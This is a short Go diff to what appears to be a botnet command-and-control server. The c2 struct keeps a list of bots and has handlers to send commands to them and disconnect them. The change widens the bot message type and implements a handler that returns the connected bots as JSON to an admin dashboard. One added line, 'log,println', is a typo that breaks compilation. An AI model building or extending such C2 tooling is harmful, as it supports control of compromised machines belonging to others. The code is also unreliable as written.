@@ -42,7 +42,7 @@ type Command struct {
 
 type BotMessage struct {
 	Type    string
-	Message string
+	Message any
 }
 
 type c2 struct {
@@ -150,7 +150,13 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 
 } //send  execute command  message by admin
 func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
-	//todo
+	w.Header().Set("Content-Type", "application/json")
+	err := json.NewEncoder(w).Encode(c.bots)
+	if err != nil {
+		log.Println("Error sending list of bots : ", err)
+		return
+	}
+	log,println("List of bots send to dashboard.")
 }
 
 func (c *c2) DisconnectBot(w http.ResponseWriter, r *http.Request) {
